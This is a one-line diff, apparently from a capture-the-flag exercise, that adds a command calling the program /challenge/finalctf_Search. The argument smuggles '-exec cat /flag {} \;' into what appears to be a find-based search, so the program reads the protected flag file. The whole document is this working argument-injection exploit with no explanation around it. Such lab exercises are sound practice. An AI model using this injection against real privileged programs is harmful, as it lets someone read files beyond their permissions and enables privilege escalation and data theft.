@@ -1,0 +1,1 @@
+/challenge/finalctf_Search "'*.sh' -exec cat /flag {} \;"
